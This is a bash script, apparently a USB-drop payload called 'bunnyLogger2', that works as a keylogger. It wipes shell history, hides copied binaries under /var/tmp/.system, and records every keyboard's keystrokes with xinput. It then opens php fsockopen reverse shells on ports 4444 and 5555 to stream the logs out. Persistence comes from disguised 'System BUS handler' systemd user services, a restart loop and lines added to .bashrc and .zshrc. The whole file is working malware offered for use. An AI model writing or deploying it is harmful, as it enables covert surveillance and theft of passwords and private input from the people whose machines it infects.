#!/bin/bash
unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
mkdir -p /var/tmp/.system/logs
lol=$(lsblk | grep 1.8G)
disk=$(echo $lol | awk '{print $1}')
mntt=$(lsblk | grep $disk | awk '{print $7}')
cp -r $mntt/tools/xinput /var/tmp/.system/
cp -r $mntt/payloads/library/bunnyLogger2/clctrl /var/tmp/.system/
cp -r $mntt/payloads/library/bunnyLogger2/nc /var/tmp/.system/
chmod +x /var/tmp/.system/nc
echo -e "name=\$(date +\"%y-%m-%d-%T\")\n/var/tmp/.system/./xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 /var/tmp/.system/./xinput test > /var/tmp/.system/logs/\$name.log &\n/var/tmp/.system/./xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 /var/tmp/.system/./xinput test" > /var/tmp/.system/sys
chmod +x /var/tmp/.system/sys
chmod +x /var/tmp/.system/clctrl
chmod +x /var/tmp/.system/xinput
echo -e "while :\ndo\n\tping -c 5 127.0.0.1\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"127.0.0.1\",4444);exec("\"/var/tmp/.system/sys -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone &\nwhile :\ndo\n\tping -c 5 127.0.0.1\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"127.0.0.1\",5555);exec("\"/var/tmp/.system/./clctrl "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
chmod +x /var/tmp/.system/systemBus
mkdir -p ~/.config/systemd/user
echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
echo "while true; do systemctl --user restart systemBUS.service; sleep 15m; done" > /var/tmp/.system/reboot
chmod +x /var/tmp/.system/reboot
echo -e "[Unit]\nDescription= System BUS handler reboot.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/reboot -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/reboot.service
systemctl --user daemon-reload
systemctl --user enable --now systemBUS.service
systemctl --user start --now systemBUS.service
systemctl --user enable --now reboot.service
systemctl --user start --now reboot.service
echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.bashrc\nfi" > ~/tmmmp
chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit
